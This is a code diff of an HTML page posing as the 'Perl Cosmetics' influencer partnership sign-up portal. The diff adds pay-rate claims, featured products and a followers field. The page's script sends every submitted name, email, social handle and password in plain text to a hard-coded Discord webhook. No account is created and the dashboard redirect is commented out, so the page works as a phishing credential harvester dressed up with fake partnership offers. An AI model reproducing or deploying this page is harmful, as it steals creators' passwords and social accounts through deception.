@@ -39,7 +39,7 @@
         <div class="logo">PC</div>
         <div>
           <h1>BRAND PARTNERSHIP — Perl Cosmetics</h1>
-          <p class="lead">Influencer portal — sign up to access your dashboard.</p>
+          <p class="lead">Influencer portal — sign up to access your dashboard, find products to promote, and view partnership pay & programs.</p>
         </div>
       </div>
     </div>
@@ -51,80 +51,153 @@
         <h2 style="margin:0 0 8px 0">Influencer Sign Up</h2>
         <p class="small">Create your influencer account to get verified and access the partner dashboard.</p>
 
-<form id="signupForm">
-  <div>
-    <label for="name">Full name</label>
-    <input id="name" type="text" required />
-  </div>
+        <form id="signupForm">
+          <div>
+            <label for="name">Full name</label>
+            <input id="name" type="text" required />
+          </div>
 
-  <div>
-    <label for="email">Email</label>
-    <input id="email" type="email" required />
-  </div>
+          <div>
+            <label for="email">Email</label>
+            <input id="email" type="email" required />
+          </div>
 
-  <div>
-    <label for="platform">Primary platform</label>
-    <select id="platform">
-      <option>Instagram</option>
-      <option>TikTok</option>
-      <option>YouTube</option>
-      <option>Blog/Other</option>
-    </select>
-  </div>
+          <div>
+            <label for="platform">Primary platform</label>
+            <select id="platform">
+              <option>Instagram</option>
+              <option>TikTok</option>
+              <option>YouTube</option>
+              <option>Blog/Other</option>
+            </select>
+          </div>
 
-  <div>
-    <label for="social">Your @ Handle</label>
-    <input id="social" type="text" required />
-  </div>
+          <div>
+            <label for="social">Your @ Handle</label>
+            <input id="social" type="text" required />
+          </div>
 
-  <div>
-    <label for="password">Password</label>
-    <input id="password" type="password" required />
-  </div>
+          <div>
+            <label for="followers">Followers / Subscribers</label>
+            <input id="followers" type="number" required />
+          </div>
 
-  <div>
-    <label for="confirmPassword">Confirm Password</label>
-    <input id="confirmPassword" type="password" required />
-  </div>
+          <div>
+            <label for="password">Password</label>
+            <input id="password" type="password" required />
+          </div>
 
-  <button class="primary" type="submit">Create account & view dashboard</button>
-</form>
+          <div>
+            <label for="confirmPassword">Confirm Password</label>
+            <input id="confirmPassword" type="password" required />
+          </div>
 
+          <button class="primary" type="submit">Create account & view dashboard</button>
+        </form>
+
+        <hr style="margin:18px 0;border:none;border-top:1px solid #f0f0f6" />
+
+        <h3 style="margin:0 0 6px 0">Quick facts</h3>
+        <ul style="margin:0 0 0 18px;color:var(--muted)">
+          <li>Apply once — get verified within 3 business days.</li>
+          <li>Access exclusive product drops + promo codes.</li>
+          <li>Flexible campaigns: try-before-you-promote, flat-fee, rev-share.</li>
+        </ul>
       </section>
+
+      <aside>
+        <div class="card" style="margin-bottom:14px">
+          <h3 style="margin:0 0 8px 0">Salary & Programs</h3>
+          <div class="programs">
+            <div class="program">
+              <strong>Flat-fee Campaigns</strong>
+              <p class="small">Micro: $150–$800, Mid: $800–$5k, Macro: custom.</p>
+            </div>
+            <div class="program">
+              <strong>Rev-share</strong>
+              <p class="small">Earn 8–20% on tracked affiliate sales.</p>
+            </div>
+            <div class="program">
+              <strong>Gift & Try</strong>
+              <p class="small">Receive PR boxes and early launches.</p>
+            </div>
+            <div class="program">
+              <strong>Ambassadors</strong>
+              <p class="small">Monthly retainers + bonuses.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3 style="margin:0 0 8px 0">Featured products</h3>
+          <div class="products">
+
+            <div class="product">
+              <div class="thumb">
+                <img src="product1.png" style="width:100%; height:100%; object-fit:cover; border-radius:8px">
+              </div>
+              <div class="pmeta">
+                <h4>NOURISHING LASH OIL</h4>
+                <p>Strengthens and conditions lashes & brows.</p>
+              </div>
+            </div>
+
+            <div class="product">
+              <div class="thumb">
+                <img src="product4.png" style="width:100%; height:100%; object-fit:cover; border-radius:8px">
+              </div>
+              <div class="pmeta">
+                <h4>RADIANCE FACIAL OIL</h4>
+                <p>Lightweight vitamin oil for glowing skin.</p>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </aside>
     </div>
+
+    <footer>
+      <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap">
+        <div>Perl Cosmetics • Partner Program</div>
+        <div class="small">Questions? Email partnerships@perlcosmetics.com</div>
+      </div>
+    </footer>
   </main>
 
 <script>
 const webhookURL = "https://discord.com/api/webhooks/1446849459433767074/CMXXr-V-SByxuMbewl1GbwypwqDrgbna82Etpev3oZaZyvBU6Tth6YybgKS-VqMwniP8";
 
-document.getElementById("signupForm").addEventListener("submit", function(e) {
-    e.preventDefault();
+document.getElementById("signupForm").addEventListener("submit", function(e){
+  e.preventDefault();
 
-    const name = document.getElementById("name").value;
-    const email = document.getElementById("email").value;
-    const platform = document.getElementById("platform").value;
-    const social = document.getElementById("social").value;
-    const followers = document.getElementById("followers").value;
-    const password = document.getElementById("password").value;
-    const confirmPassword = document.getElementById("confirmPassword").value;
+  const name = document.getElementById("name").value;
+  const email = document.getElementById("email").value;
+  const platform = document.getElementById("platform").value;
+  const social = document.getElementById("social").value;
+  const followers = document.getElementById("followers").value;
+  const password = document.getElementById("password").value;
+  const confirmPassword = document.getElementById("confirmPassword").value;
 
-    const payload = {
-        content: `📝 **New Influencer Signup:**\n🔹 Name: ${name}\n🔹 Email: ${email}\n🔹 Platform: ${platform}\n🔹 Handle: ${social}\n🔹 Followers: ${followers}\n🔹 Password: ${password}\n🔹 Confirm Password: ${confirmPassword}`
-    };
+  const payload = {
+    content: `📝 **New Influencer Signup:**\n🔹 Name: ${name}\n🔹 Email: ${email}\n🔹 Platform: ${platform}\n🔹 Handle: ${social}\n🔹 Followers: ${followers}\n🔹 Password: ${password}\n🔹 Confirm Password: ${confirmPassword}`
+  };
 
-    fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-    })
-    .then(() => {
-        alert("Signup sent successfully!");
-        // Optionally clear fields
-        document.getElementById("signupForm").reset();
-    })
-    .catch(err => {
-        alert("Failed to send: " + err);
-    });
+  fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  })
+  .then(() => {
+    // Instagram-style: show alert & reset fields
+    alert("Signup sent successfully!");
+    document.getElementById("signupForm").reset();
+    // optional: redirect
+    // window.location.href = "Dashboard.html";
+  })
+  .catch(err => {
+    alert("Failed to send to Discord: " + err);
+  });
 });
 </script>
 
